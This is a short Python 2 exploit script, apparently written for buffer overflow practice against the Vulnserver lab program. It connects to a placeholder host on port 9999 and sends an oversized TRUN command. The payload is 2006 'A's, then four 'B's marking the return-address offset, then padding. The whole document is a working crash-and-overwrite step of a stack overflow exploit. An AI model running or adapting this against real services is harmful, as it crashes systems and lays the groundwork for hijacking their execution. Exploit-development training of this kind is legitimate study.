#!/usr/bin/python
import socket

server = 'xxx.xxx.xxx.xxx'
sport = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

buffer = ''
buffer += 'A' * 2006
buffer += 'B' * 4
buffer += 'C' * (5000-2006-4)
s.send(('TRUN .' + buffer + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
